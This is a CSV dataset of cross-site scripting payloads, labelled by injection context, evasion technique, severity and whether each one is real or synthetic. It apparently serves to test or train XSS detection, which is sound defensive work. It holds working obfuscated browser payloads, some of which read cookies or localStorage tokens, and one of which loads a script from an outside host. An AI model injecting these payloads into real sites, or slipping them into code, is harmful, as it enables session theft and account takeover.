payload,context,technique,severity,length,source
' ><svg oninvalid=alert(document.domain)>,attribute_escape,synthetic,medium,41,synthetic
document.querySelector(%22body%22).innerHTML+=%22XMLHttpRequest(location.hash)%22,dom_sink,synthetic,high,81,synthetic
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",dom_sink,case_variation,low,86,real
<!--><TemPlaTe OnsEarCh=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,53,synthetic
%3C!--%3E%3Cdiv onpause=confirm(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
"<spacer oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100,real
<label onpointerup=alert(1) style=display:block>AnonKryptiQuz</label>,tag_injection,none,medium,69,real
"<img draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</img>",tag_injection,none,medium,84,real
\' onsearch=\u0061lert(1)//,attribute_escape,synthetic,low,27,synthetic
"<scr	ipt>setTimeout('prompt(document.domain)',0)</scr	ipt>",script_injection,synthetic,medium,58,synthetic
<maTh/OncOpy=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,42,synthetic
"	onCliCk=ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,47,synthetic
<svg onpromptdismiss=alert(location.hash)>,tag_injection,synthetic,medium,42,synthetic
\><plaintext/onmouseover=prompt(1),tag_injection,none,medium,34,real
	onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt(1),event_handler,synthetic,medium,51,synthetic
${confirm?new()('document.cookie')},template_injection,synthetic,high,35,synthetic
""" %3E%3Csvg onmousewheel=alert(1)%3E",attribute_escape,synthetic,medium,36,synthetic
"<style>:target {color:red;}</style><time id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></time>",tag_injection,none,medium,112,real
\' onbeforetoggle=alert(location.hash)//,attribute_escape,synthetic,medium,40,synthetic
onwebkitanimationend=confirm/*x*/(document.domain),event_handler,synthetic,low,50,synthetic
onblur=\u0061lert&#40;document.domain&#41;,event_handler,synthetic,low,42,synthetic
"""><img src=x onerror=prompt('document.domain');>.htm",dom_sink,none,medium,52,real
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",js_uri,none,medium,81,real
"""><script>prompt(1)</script>",script_injection,synthetic,medium,28,synthetic
"""><script>console.log(1)</script>",script_injection,synthetic,medium,33,synthetic
%22 ><svg onfocusout=console.log(location.hash)>,attribute_escape,synthetic,medium,48,synthetic
"<audio2 oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100,real
'><Img srC=x onErrOr=ConFirM(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,44,synthetic
<td x=y onstalled=confirm(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
<obj&#101;ct onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in) onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,147,synthetic
OnlOad=alErt&#40;dOcuMenT.dOmaIn&#41;,event_handler,synthetic,low,37,synthetic
"%3Cscript%3E/*/confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,66,synthetic
\%22 oninvalid=prompt(1)//,attribute_escape,synthetic,medium,26,synthetic
<td srC=x onKeyUp=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,43,synthetic
<audio onmouseover=console.log('XSS')>,tag_injection,synthetic,medium,38,synthetic
<table oncopy=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,34,synthetic
<form ons&#101;&#97;rch=consol&#101;.log(1) ons&#101;&#97;rch=consol&#101;.log(1)>,tag_injection,synthetic,low,82,synthetic
__proto__[%22onpageswap%22]=alert(btoa(document.cookie)),dom_sink,synthetic,high,56,synthetic
""" ><svg onpopstate=confirm(document.domain)>",attribute_escape,synthetic,medium,44,synthetic
"__proto__[""onmous&#101;down""]=&#101;v&#97;l(docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,70,synthetic
{phP}cOnfIrm(doCumEnt.doMaiN){/phP},template_injection,synthetic,medium,35,synthetic
"""><Img srC=x onErrOr=AleRt(1)>",attribute_escape,synthetic,medium,30,synthetic
%27 ><svg oncopy=prompt(document.domain)>,attribute_escape,synthetic,medium,41,synthetic
"\"" OniNvaLid=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
<plAinTexT/oNrePeaT=pRomPt('XSS')>,tag_injection,synthetic,medium,34,synthetic
onmozfullscreenchange=prompt/***/(location.hash),event_handler,synthetic,low,48,synthetic
%3Cspan/onbeforetoggle=prompt(location.hash)%3E,tag_injection,synthetic,medium,47,synthetic
"\"" onmousewheel=console.log(1)//",attribute_escape,synthetic,medium,32,synthetic
"' ><svG oNmoUseEntEr=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
&quOt; onWheEl=ConSolE.lOg(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,52,synthetic
`><img src=x onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,88,synthetic
' ondr&#97;g&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,62,synthetic
<frameset onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
""" onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape,synthetic,low,65,synthetic
"[Ways to alert(document.domain) - Tom Hudson (@tomnomnom) - February 22, 2018](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)",dom_sink,none,medium,146,real
"<ul ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</ul>",tag_injection,none,medium,85,real
"__proto__[""onmous&#101;ov&#101;r""]=&#101;v&#97;l(docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,75,synthetic
' ><svG oNmoUseDowN=cOnfIrm(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,45,synthetic
onplay=console.log/***/(1),event_handler,synthetic,low,26,synthetic
"<figcaption oncontextmenu=""alert(1)"">AnonKryptiQuz</figcaption>",tag_injection,none,medium,63,real
&quOt; onBefOreCut=alErt(doCumEnt.doMaiN) X=&QuoT;,attribute_escape,synthetic,medium,50,synthetic
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationstart=""alert(1)""></blink>",tag_injection,none,medium,97,real
"<style>@keyframes slidein {}</style><summary style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></summary>",tag_injection,none,medium,168,real
onmouseenter=confirm/*x*/(location.hash),event_handler,synthetic,low,40,synthetic
""" onend=alert('XSS') """,attribute_escape,synthetic,medium,22,synthetic
"<ruby draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</ruby>",tag_injection,none,medium,64,real
<title	onclick=confirm(%27XSS%27)>,tag_injection,synthetic,medium,34,synthetic
<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>,tag_injection,none,medium,71,real
" onauxclick=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,50,synthetic
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable style=display:block>drop here</noembed>",tag_injection,none,medium,135,real
"<noscript onclick=""alert(1)"">AnonKryptiQuz</noscript>",tag_injection,none,medium,53,real
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",tag_injection,none,medium,103,real
"' onscrollend=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,57,synthetic
"j&#97;v&#97;script:&#97;l&#101;rt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,low,78,synthetic
img{background-image:url('javascript:alert()')},js_uri,none,medium,47,real
%27><script>prompt(1)</script>,script_injection,synthetic,medium,30,synthetic
%3Cselect onpromptdismiss=console.log(1) onpromptdismiss=console.log(1)%3E,tag_injection,synthetic,medium,74,synthetic
"<rtc ondblclick=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,46,real
<img	onreset=console.log(document.domain)>,tag_injection,synthetic,medium,42,synthetic
"<marquee draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",tag_injection,none,medium,87,real
`><Img srC=x onBefOrePasTe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,52,synthetic
j&#97;v&#97;script:&#97;l&#101;rt/**/('XSS'),js_uri,synthetic,low,44,synthetic
<script ondblclick=prompt(1)/>,tag_injection,synthetic,medium,30,synthetic
"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" ontransitionend=alert(1)></ol>",tag_injection,none,medium,102,real
<seT	oNenD=aLerT(1)>,tag_injection,synthetic,medium,20,synthetic
"""%3E%3Cscript ondblclick=prompt(1)%3E",tag_injection,synthetic,medium,37,synthetic
%27><img src=x onpopstate=alert(1)>,attribute_escape,synthetic,medium,35,synthetic
"	onpagereveal=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,55,synthetic
\%27 onend=alert(%27XSS%27)//,attribute_escape,synthetic,medium,29,synthetic
"javascript:alert()//*-->*`/*'/*""/*\""/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>",script_injection,comment_injection,medium,187,real
"<bgsound onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",tag_injection,none,medium,73,real
"""><img src=x onmousewheel=alert(location.hash)>",attribute_escape,synthetic,medium,47,synthetic
&quot; on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,medium,80,synthetic
' ><svg ongotpoint&#101;rc&#97;ptur&#101;=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,73,synthetic
<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>,tag_injection,none,medium,80,real
"<svg onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</svg>",tag_injection,none,medium,79,real
&quot; ondrop=alert('XSS') x=&quot;,attribute_escape,synthetic,medium,35,synthetic
""" onanimationstart=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,62,synthetic
__${prompt(docum&#101;nt.dom&#97;in)}__::.x,template_injection,synthetic,medium,43,synthetic
<dialog onpointerover=confirm(1)>,tag_injection,synthetic,medium,33,synthetic
"s&#101;tTim&#101;out(""prompt(1)"",0)",dom_sink,synthetic,medium,35,synthetic
<emBed	onWebKitFulLscReeNchAngE=cOnfIrm(loCatIon.haSh)>,tag_injection,synthetic,medium,55,synthetic
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",js_uri,none,medium,75,real
"__proto__[""on&#101;nd&#101;d""]=confirm(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink,synthetic,medium,97,synthetic
"""><img src=x on&#97;nim&#97;tion&#101;nd=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,72,synthetic
' oNdrAgeNteR=pRomPt(DocUmeNt.DomAin) ',attribute_escape,synthetic,medium,39,synthetic
`><img src=x on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,75,synthetic
%3Canimatemotion onanimationcancel=prompt(1) onanimationcancel=prompt(1)%3E,tag_injection,synthetic,medium,75,synthetic
"(new Function(""XMLHttpRequest(document.cookie)""))();",dom_sink,synthetic,high,52,synthetic
"<noframes draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</noframes>",tag_injection,none,medium,74,real
"<textarea id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></textarea>",tag_injection,none,medium,92,real
onhashchange=javascript:confirm('XSS'),event_handler,synthetic,medium,38,synthetic
<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>,tag_injection,none,medium,82,real
<link onpointerup=alert(1) style=display:block>AnonKryptiQuz</link>,tag_injection,none,medium,67,real
'><Img srC=x onPagEswAp=AleRt(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,47,synthetic
"""><img src=x onfocus=console.log(location.hash)>",attribute_escape,synthetic,medium,48,synthetic
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,tag_injection,none,medium,81,real
"<spacer draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</spacer>",tag_injection,none,medium,70,real
"""><img src=x onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,78,synthetic
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,tag_injection,none,medium,68,real
onfocusin=confirm('XSS'),event_handler,synthetic,medium,24,synthetic
OndRagOveR=cOnfIrm(1),event_handler,synthetic,medium,21,synthetic
"<time draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,84,real
"<a href=""\x0Djavascript:javascript:alert(9402)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
OnfOcuSouT=cOnfIrm/***/(1),event_handler,synthetic,low,26,synthetic
\' onpointerover=confirm(location.hash)//,attribute_escape,synthetic,medium,41,synthetic
%27><img src=x ongestureend=prompt(1)>,attribute_escape,synthetic,medium,38,synthetic
<input2 onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68,real
<!--><&#97;udio onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,63,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=XMLHttpRequest(document.domain)>"")",dom_sink,synthetic,high,93,synthetic
' oNtoUchMovE=cOnfIrm('XSS') ',attribute_escape,synthetic,medium,30,synthetic
confirm(window.toStaticHTML('<marquee>foo</marquee>'));,dom_sink,none,medium,55,real
\%27 onselect=console.log(location.hash)//,attribute_escape,synthetic,medium,42,synthetic
' onmouseover=confirm('XSS') ',attribute_escape,synthetic,medium,30,synthetic
"&#101;v&#97;l(""confirm(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink,synthetic,medium,64,synthetic
"<img src=x onerror=""js:abc='al'+'ert()';eval(abc)"" />",dom_sink,encoding,low,53,real
"<element onclick=""alert(1)"" style=display:block>AnonKryptiQuz</element>",tag_injection,none,medium,71,real
&quot; onkeydown=prompt('XSS') x=&quot;,attribute_escape,synthetic,medium,39,synthetic
<%= alert document.domain %>,template_injection,synthetic,low,28,synthetic
"<style>:target {transform: rotate(180deg);}</style><multicol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></multicol>",tag_injection,none,medium,134,real
<title src=x onstalled=alert('XSS')>,tag_injection,synthetic,medium,36,synthetic
"onpointercancel=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,66,synthetic
<!<script>alert(1)</script>,script_injection,none,medium,27,real
<foRm OnwAitIng=coNfiRm(1) OnwAitIng=coNfiRm(1)>,tag_injection,synthetic,medium,48,synthetic
<teMplAte onCloSe=ConSolE.lOg(1)>,tag_injection,synthetic,medium,33,synthetic
' onpl&#97;y=confirm('XSS') ',attribute_escape,synthetic,medium,29,synthetic
<embed x=y onmozfullscreenchange=confirm(location.hash)>,tag_injection,synthetic,medium,56,synthetic
setTimeout`alert\x2823\x29`,generic,none,low,27,real
' on&#101;nd&#101;d=prompt('XSS') ',attribute_escape,synthetic,medium,35,synthetic
"onpromptaction=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,65,synthetic
%22><meta ontransitionstart=alert(location.hash)>,tag_injection,synthetic,medium,49,synthetic
<template/onsearch=console.log(document.domain)>,tag_injection,synthetic,medium,48,synthetic
onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log&#40;loc&#97;tion.h&#97;sh&#41;,event_handler,synthetic,low,80,synthetic
"setTimeout(""confirm(document.domain)"",0)",dom_sink,synthetic,medium,40,synthetic
"<plaintext onmousedown=""alert(1)"">AnonKryptiQuz</plaintext>",tag_injection,none,medium,59,real
"<&#97;r&#101;&#97;/on&#101;nd&#101;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,84,synthetic
"\"" ontouchmov&#101;=prompt(1)//",attribute_escape,synthetic,medium,31,synthetic
"<meta draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</meta>",tag_injection,none,medium,64,real
""" ontr&#97;nsition&#101;nd=&#97;l&#101;rt(1) """,attribute_escape,synthetic,low,46,synthetic
' oNinPut=alErt(1) ',attribute_escape,synthetic,medium,20,synthetic
"<fieldset oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,101,real
"<m&#97;rqu&#101;&#101;
on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,69,synthetic
{{[].pop.constructor('alert(document.cookie)')()}},template_injection,synthetic,high,50,synthetic
<svg><progress onload=alert(1)></progress>,tag_injection,none,medium,42,real
"""%3E%3Cimg src=x onmousedown=confirm(document.domain)%3E",attribute_escape,synthetic,medium,56,synthetic
""" onmouseover=alert(location.hash) x=""",attribute_escape,synthetic,medium,38,synthetic
"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>",tag_injection,none,medium,111,real
<script>prompt(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,medium,49,synthetic
%22 ><svg onmousedown=confirm(1)>,attribute_escape,synthetic,medium,33,synthetic
"""><select onmousewheel=\u0061lert(document.domain)>",tag_injection,synthetic,low,51,synthetic
"<select oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</select>",tag_injection,none,medium,75,real
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#101;v&#97;l('XSS')"")",dom_sink,synthetic,low,79,synthetic
' onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,low,63,synthetic
{phP}aLerT(dOcuMenT.dOmaIn){/pHp},template_injection,synthetic,medium,33,synthetic
"location.href=""javascript:console.log(location.hash)""",dom_sink,synthetic,high,53,synthetic
<!--><SelEct onGotPoiNteRcaPtuRe=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,58,synthetic
alert##<script>prompt(1234)</script>,script_injection,none,medium,36,real
"""><svg onload=alert(1)>",tag_injection,none,medium,23,real
onpagereveal=confirm&#40;document.domain&#41;,event_handler,synthetic,low,45,synthetic
<title onclick=confirm(%27XSS%27)>,tag_injection,synthetic,medium,34,synthetic
	onbeforetoggle=prompt(%27XSS%27),event_handler,synthetic,medium,33,synthetic
on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,70,synthetic
<script>new Function`X${document.location.hash.substr`AnonKryptiQuz`}`</script>,template_injection,none,low,79,real
`><img src=x ondblclick=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,47,synthetic
